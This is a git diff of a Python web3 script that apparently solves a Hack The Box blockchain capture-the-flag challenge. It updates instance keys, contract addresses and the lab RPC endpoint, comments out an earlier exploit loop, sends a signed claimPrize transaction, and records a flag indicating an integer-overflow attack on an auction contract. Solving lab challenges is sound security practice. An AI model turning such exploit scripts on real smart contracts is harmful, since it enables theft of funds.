@@ -4,10 +4,10 @@ from web3.gas_strategies.rpc import rpc_gas_price_strategy
 from solcx import compile_source, install_solc, compile_files
 
 x = {
-    "PrivateKey": "0x4447c67fe4186a19ccb3b9e97487a63c0cc47a5389aba21472e9bb07d078fc3f",
-    "Address": "0xc9C371e1Df726BB42d849bCE59674543df0915f9",
-    "TargetAddress": "0x9CD3Fc15a9A963274Fe569b9bdaFcC9E1c0678eA",
-    "setupAddress": "0xabe05B68843dA39b0C88DDF9cBbF8a71846F8581"
+    "PrivateKey": "0xe97e9a50df5711155784c2ba4a081ec93ded97108a2732ec0263b48c5060e764",
+    "Address": "0xddd1f91E00CE66BcBa3b667E1aE5E990C3D9128D",
+    "TargetAddress": "0x54F9109aEa062D4A992e64641D45B957688b3447",
+    "setupAddress": "0xd31d2C8Cfde0719166E0273B7AE5D6250Dd15890"
 }
 
 PrivateKey =    x["PrivateKey"]
@@ -15,9 +15,9 @@ Address =       x["Address"]
 TargetContract = x["TargetAddress"]
 SetupContract =  x["setupAddress"]
 
-Target2Contract = "0xF40E9f7387474d0744072B1A1E36B9081A747d5C"
+Target2Contract = "0x56FAC5707F851732F435823725Ab947DfF0e2aA2"
 
-url = 'http://167.172.62.51:30904/rpc'
+url = 'http://157.245.43.189:30752/rpc'
 
 YEAR = 31556926
 
@@ -55,6 +55,7 @@ target2 = Target2Contract
 
 contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi_contract)
 
+'''
 ii = 0
 for i in range(index//2 + 1):
 	value = values[ii]
@@ -81,16 +82,36 @@ for i in range(index//2 + 1):
 	print(contract_instance.functions.timeout().call())
 	#print(contract_instance.functions.keyOwner().call())
 
+'''
 #contract_instance2.functions.withdraw().call()
 #contract_instance2.functions.claim().call()
-print(contract_instance.functions.topBidder().call())
-print(addr)
-print(contract_instance.functions.keyOwner().call())
+#print(contract_instance.functions.topBidder().call())
+#print(addr)
+#print(contract_instance.functions.keyOwner().call())
 
-print(w3.eth.get_block("latest").timestamp)
-print(contract_instance.functions.timeout().call())
+#print(w3.eth.get_block("latest").timestamp)
+#print(contract_instance.functions.timeout().call())
 
-contract_instance.functions.claimPrize().call()
+#balance = w3.eth.get_balance(account_address)
+#print(balance)
+#balance = balance//2
+
+construct_txn = contract_instance.functions.claimPrize().build_transaction(
+        {
+                'from': addr,
+                'nonce': w3.eth.get_transaction_count(addr),
+                'chainId': w3.eth.chain_id,
+                #'value' : 1
+                #"gasPrice": w3.to_wei(50, 'gwei'),
+                #"gas": 21000,
+                #"value": w3.to_wei("0", "ether"),
+        }
+)
+tx_create = w3.eth.account.sign_transaction(construct_txn, PrivateKey)
+tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
+tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
+
 
 
 compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
@@ -100,7 +121,7 @@ contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
 number = contract_instance.functions.isSolved(account_address).call()
 
 print(f'The current number stored is: { number } ')
-#
+#HTB{0v32f10w_70_w1n_7h3_4uc710n}
 
 '''
 https://ctftime.org/writeup/31583
